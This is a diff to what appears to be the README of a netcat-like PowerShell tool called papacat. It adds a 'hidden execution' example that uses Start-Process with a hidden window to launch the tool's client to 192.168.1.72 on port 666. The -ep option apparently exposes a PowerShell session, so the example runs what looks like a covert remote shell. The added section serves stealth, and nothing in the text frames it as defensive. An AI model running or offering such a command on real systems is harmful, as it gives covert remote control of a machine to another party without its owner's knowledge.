@@ -96,6 +96,11 @@ Import-Module -Name .\papacat.ps1 -Force
 papacat -c 192.168.1.72 -ep -p 666 -v
 ```
 
+#### powershell Client (hidden execution)
+```powershell
+Start-Process -WindowStyle Hidden powershell -ArgumentList "Import-Module .\papacat.ps1 -Force;papacat -c 192.168.1.72 -ep -p 666 -v"
+```
+
 ---
 
 <br /><br />
